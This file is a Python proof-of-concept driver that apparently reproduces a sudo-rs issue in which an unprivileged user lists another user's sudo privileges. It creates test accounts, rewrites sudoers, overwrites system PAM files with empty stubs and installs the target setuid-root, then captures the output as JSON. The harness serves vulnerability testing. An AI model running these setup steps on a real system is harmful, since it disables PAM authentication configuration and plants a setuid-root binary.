#!/usr/bin/env python3
"""PoC driver: multi-user sudo-rs privilege-listing scenario.

Builds the full scenario at runtime (users, sudoers config, PAM stubs,
setuid-root install of the target), then runs the tool as the unprivileged
`invoker` account in privilege-listing mode against `victim` and emits a
fixed JSON result on stdout.
"""

import argparse
import json
import os
import pwd
import shutil
import signal
import stat
import subprocess
import sys
import time

SUDOERS_RS_PATH = "/etc/sudoers-rs"
PAM_SERVICE_PATH = "/etc/pam.d/sudo"
PAM_OTHER_PATH = "/etc/pam.d/other"
PAM_CONF_PATH = "/etc/pam.conf"
INSTALL_DIR = "/opt/poc-sudo"
INSTALL_PATH = os.path.join(INSTALL_DIR, "sudo")

SUDOERS_CONTENT = (
    "invoker ALL=(ALL:ALL) NOPASSWD: /bin/true\n"
    "victim ALL=(ALL:ALL) ALL\n"
)
PAM_STUB = "# PoC: comment-only PAM service file; no modules are loaded.\n"

INVOKER = "invoker"
VICTIM = "victim"
DEFAULT_TIMEOUT = 30.0


def ensure_user(name):
    """Create the account if missing; reuse it otherwise."""
    try:
        pwd.getpwnam(name)
        return
    except KeyError:
        pass
    subprocess.run(
        ["useradd", "-m", name],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def write_file(path, content, mode, owner=(0, 0)):
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(content)
    os.chown(path, owner[0], owner[1])
    os.chmod(path, mode)


def install_binary(binary):
    os.makedirs(INSTALL_DIR, exist_ok=True)
    os.chmod(INSTALL_DIR, 0o755)
    shutil.copyfile(binary, INSTALL_PATH)
    os.chown(INSTALL_PATH, 0, 0)
    os.chmod(INSTALL_PATH, 0o4755)
    return INSTALL_PATH


def setup_scenario(binary):
    ensure_user(INVOKER)
    ensure_user(VICTIM)
    write_file(SUDOERS_RS_PATH, SUDOERS_CONTENT, 0o440)
    write_file(PAM_SERVICE_PATH, PAM_STUB, 0o644)
    write_file(PAM_OTHER_PATH, PAM_STUB, 0o644)
    write_file(PAM_CONF_PATH, PAM_STUB, 0o644)
    return install_binary(binary)


def demote_to(uid, gid, username):
    def _demote():
        os.initgroups(username, gid)
        os.setgid(gid)
        os.setuid(uid)
    return _demote


def run_invocation(command, timeout):
    """Run the tool as `invoker`; capture stdout/stderr with a timeout."""
    invoker_pw = pwd.getpwnam(INVOKER)
    env = {
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "HOME": invoker_pw.pw_dir,
        "USER": INVOKER,
        "LOGNAME": INVOKER,
        "LANG": "C",
    }
    result = {
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
    }
    start = time.monotonic()
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.DEVNULL,
        env=env,
        cwd=invoker_pw.pw_dir,
        preexec_fn=demote_to(invoker_pw.pw_uid, invoker_pw.pw_gid, INVOKER),
    )
    try:
        out, err = proc.communicate(timeout=timeout)
        result["returncode"] = proc.returncode
        if proc.returncode is not None and proc.returncode < 0:
            try:
                result["signal"] = signal.Signals(-proc.returncode).name
            except ValueError:
                result["signal"] = "SIG%d" % (-proc.returncode)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, err = proc.communicate()
        result["timed_out"] = True
    result["runtime_ms"] = int(round((time.monotonic() - start) * 1000))
    result["stdout"] = out.decode("utf-8", errors="replace")
    result["stderr"] = err.decode("utf-8", errors="replace")
    return result


def parse_args(argv):
    parser = argparse.ArgumentParser(description="sudo-rs multi-user PoC driver")
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None, help="mirror JSON result to this file")
    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help="per-invocation timeout in seconds",
    )
    return parser.parse_args(argv)


def main(argv):
    args = parse_args(argv)

    command = []
    invocation = {
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
    }
    error = None
    try:
        installed = setup_scenario(args.binary)
        command = [installed, "-l", "-U", VICTIM]
        invocation = run_invocation(command, args.timeout)
        if invocation["timed_out"]:
            error = "invocation timed out after %s seconds" % args.timeout
    except Exception as exc:  # noqa: BLE001 - surface any setup failure in JSON
        error = "%s: %s" % (type(exc).__name__, exc)

    combined = invocation["stdout"] + invocation["stderr"]
    result = {
        "binary": args.binary,
        "command": command,
        "returncode": invocation["returncode"],
        "signal": invocation["signal"],
        "timed_out": invocation["timed_out"],
        "runtime_ms": invocation["runtime_ms"],
        "stdout": invocation["stdout"],
        "stderr": invocation["stderr"],
        "observable": {
            "kind": "combined_output",
            "value": combined,
            "path": command[0] if command else None,
        },
        "error": error,
    }

    payload = json.dumps(result, indent=2)
    print(payload)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as handle:
            handle.write(payload + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
